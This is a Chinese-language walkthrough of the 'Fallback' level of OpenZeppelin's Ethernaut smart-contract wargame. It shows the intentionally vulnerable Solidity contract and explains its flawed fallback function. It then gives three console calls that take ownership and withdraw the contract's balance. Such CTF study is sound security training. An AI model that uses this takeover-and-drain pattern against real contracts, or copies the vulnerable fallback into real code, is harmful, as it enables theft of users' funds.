# The Ethernaut by OpenZeppelin


## 01.Fallback
**要求** :
`成为合约的owner`
`将余额减少为0`

**合约代码** :
```
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
import 'openzeppelin-solidity/contracts/math/SafeMath.sol';
//合约Fallback继承自Ownable
contract Fallback is Ownable {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
//通过构造函数初始化贡献者的值为1000ETH
  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }
// 将合约所属者移交给贡献最高的人，这也意味着你必须要贡献1000ETH以上才有可能成为合约的owner
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] = contributions[msg.sender].add(msg.value);
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
//获取请求者的贡献值
  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }
//取款函数，且使用onlyOwner修饰，只能被合约的owner调用
  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }
//fallback函数，用于接收用户向合约发送的代币
  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);// 判断了一下转入的钱和贡献者在合约中贡献的钱是否大于0
    owner = msg.sender;
  }
}

```
**分析** :
```
 问题代码:
 function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }

 触发fallback()函数来实现
```

**攻击流程** :
```
contract.contribute({value: 1}) //首先使贡献值大于0
contract.sendTransaction({value: 1}) //执行一个不存在的函数, 触发fallback函数
contract.withdraw() //将合约的balance提走清零
```

